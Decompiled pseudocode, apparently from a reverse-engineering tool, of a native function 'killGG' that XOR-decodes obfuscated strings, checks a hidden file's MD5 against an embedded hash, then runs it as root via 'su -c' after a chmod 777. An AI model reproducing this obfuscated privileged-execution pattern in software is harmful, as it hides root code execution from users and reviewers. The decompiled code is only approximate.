// detected - ay::obfuscate (compile-time XOR string obfuscation) (detection may be wrong)
// detected - Single-byte XOR key (0x2e) (detection may be wrong)
// detected - XOR with constant (detection may be wrong)
uint64_t _Z6killGGv(void)

{

  int4 val1;
  uint4 val2;
  uint8 val3;
  void *param1;
  char *pcVar5;

  uint8 val4;
  uint8_t axStack_68 [16];
  uint8_t axStack_58 [16];

  if (((unk_c01d0 & 1) == 0) &&
     (val1 = __cxa_guard_acquire((void *)0xc01d0), val1 != 0)) {
    unk_c01c8 = 0x5d57;
    unk_c01a8 = unk_84048;
    unk_c01a0 = unk_84040;
    unk_c01b8 = unk_84058;
    unk_c01b0 = "AFOC";
    unk_c01c0 = unk_84080;
    unk_c01ca = 0x2e;
    __cxa_atexit(_ZN2ay14OBFUSCATE_dataILm43ELc46EED2Ev,0xc01a0,0xc0000);
    __cxa_guard_release((void *)0xc01d0);
  }
  if (unk_c01ca != 0) {
    unk_c01a0 = unk_c01a0 ^ 0x2e2e2e2e2e2e2e2e;
    unk_c01a8 = unk_c01a8 ^ 0x2e2e2e2e2e2e2e2e;
    unk_c01b0 = unk_c01b0 ^ 0x2e2e2e2e2e2e2e2e;
    unk_c01b8 = unk_c01b8 ^ 0x2e2e2e2e2e2e2e2e;
    unk_c01ca = unk_c01ca ^ 0x2e;
    unk_c01c0 = unk_c01c0 ^ 0x2e2e2e2e2e2e2e2e;
    unk_c01c8 = unk_c01c8 ^ 0x2e2e;
  }
  val1 = access(0xc01a0,0);
  if (val1 != -1) {
    if (((unk_c0208 & 1) == 0) &&
       (val1 = __cxa_guard_acquire((void *)0xc0208), val1 != 0)) {
      unk_c01e8 = unk_84068;
      unk_c01e0 = unk_84060;
      unk_c01f8 = unk_84078;
      unk_c01f0 = unk_84070;
      unk_c0200 = 0x2e;
      __cxa_atexit(_ZN2ay14OBFUSCATE_dataILm33ELc46EED2Ev,0xc01e0,0xc0000);
      __cxa_guard_release((void *)0xc0208);
    }
    _ZN2ay14OBFUSCATE_dataILm33ELc46EE7decryptEv(0xc01e0);
    val3 = strlen((char *)0xc01e0);
    if (val3 != 0) {
      val4 = 0;
      do {
        sscanf((char *)(val4 + 0xc01e0),(char *)"%2hhx");
        val4 = val4 + 2;
      } while (val4 < val3);
    }
    param1 = fopen((char *)0xc01a0,(char *)"rb");
    if (param1 == (void *)0x0) {
      perror("fopen");
    }
    else {
      _Z7md5FileP7__sFILEPh(param1,axStack_58);
      fclose(param1);
      val1 = memcmp(axStack_58,axStack_68,0x10);
      if (val1 == 0) {
        val3 = strlen((char *)0xc01a0);
        pcVar5 = malloc(val3 + 0x13);
        sprintf(pcVar5,(char *)"su -c \"chmod 777 %s\"");
        system(pcVar5);
        free(pcVar5);
        val3 = strlen((char *)0xc01a0);
        pcVar5 = malloc(val3 + 9);
        sprintf(pcVar5,(char *)"su -c \"%s\"");
        val2 = system(pcVar5);
        free(pcVar5);
        if ((val2 != 0xffffffff) && ((val2 & 0xff7f) == 0)) {

          goto code_r0x00018ed4;
        }
      }
    }
  }
  exit(0);
code_r0x00018ed4:
  __stack_chk_fail();
}